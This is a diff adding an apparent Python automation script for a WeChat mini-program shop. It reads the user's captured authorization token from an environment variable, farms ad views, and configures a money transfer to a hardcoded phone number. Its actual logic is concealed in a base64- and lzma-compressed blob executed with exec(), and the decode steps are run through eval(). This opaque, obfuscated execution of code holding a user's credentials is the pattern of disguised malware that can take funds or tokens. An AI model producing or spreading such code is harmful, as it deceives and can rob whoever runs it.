@@ -1,0 +1,55 @@
+import requests
+import json
+import hashlib
+import time
+import os
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+# 禁用不安全请求警告
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+# -------------------------- 可配置参数 --------------------------
+'''#
+打开链接扫图片二维码:https://q.jhzh66.com/uploads/poster/rec/recxcx/10654962.png
+进入小程序抓包搜shop的链接
+#'''
+'''
+环境变量名：JH_AT
+# 2、抓带shop链接任意请求头里的authorization
+#出这个本
+脚本都是ai写的 我只是发一下
+脚本都是ai写的 我只是发一下
+本人所发布的所有资源文件，禁止任何公众号、自媒体进行任何形式的转载、发布。 这里的脚本只是自己学习的一个实践 仅用于测试和学习研究，禁止用于商业用途，不能保证其合法性，准确性，完整性和有效性，请根据情况自行判断.
+Huaji对任何问题概不负责，包括但不限于由任何脚本错误导致的任何损失或损害. 间接使用脚本的任何用户，包括但不限于建立VPS或在某些行为违反国家/地区法律或相关法规的情况下进行传播。
+Huaji对于由此引起的任何隐私泄漏或其他后果概不负责. 如果任何单位或个人认为该项目的脚本可能涉嫌侵犯其权利，则应及时通知并提供身份证明，所有权证明，我们将在收到认证文件后删除相关脚本. 
+任何以任何方式查看此项目的人或直接或间接使用该项目的任何脚本的使用者都应仔细阅读此声明。
+免责声明:所发布的内容仅供学习，禁止用于其他用途，您必须在下载后的24小时内从计算机或手机中完全删除以上内容.严禁产生利益链！
+本人保留随时更改或补充此免责声明的权利。一旦使用或复制了任何相关脚本或项目的规则，则视为您已接受此免责声明. 如您不同意，请马上删除该文件
+
+'''
+# 广告脚本配置
+
+ad_types = [5, 4, 3, 2, 1] # 要处理的广告type列表
+
+AD_WAIT_SECONDS = 10  # 广告等待秒数
+PROGRESS_BAR_LENGTH = 10  # 进度条长度
+AD_COUNT_PER_TYPE = 5  # 每种广告处理数量
+PROGRESS_REFRESH_INTERVAL = 5  # 进度条刷新间隔
+MAX_WORKERS = 1 #并发
+#转账信息
+TRANSFER_MONEY = "1"
+TRANSFER_DESC = ""
+TRANSFER_TARGET_PHONE = "15755298975"
+
+import base64,zlib,lzma,gzip,bz2
+BASE62_CHARS="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
+def _base62_dec(d):
+ d_s=d.decode();n=0
+ for c in d_s:n=n*62+BASE62_CHARS.index(c)
+ return n.to_bytes((n.bit_length()+7)//8,"big")if n else b"\x00"
+def d(d,ops):
+ for op in reversed(ops):
+  d=zlib.decompress(d)if op=="zlib"else lzma.decompress(d)if op=="lzma"else gzip.decompress(d)if op=="gzip"else bz2.decompress(d)if op=="bz2"else base64.b64decode(d)if op=="base64"else base64.b32decode(d)if op=="base32"else _base62_dec(d)if op=="base62"else base64.b85decode(d)
+ return d.decode()
+e,b="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","Wydsem1hJywgJ2x6bWEnLCAnbHptYSdd";o=eval(base64.b64decode(b).decode())
+try:exec(d(base64.b64decode(e),o))
+except Exception as x:print(f"Error:{x}")
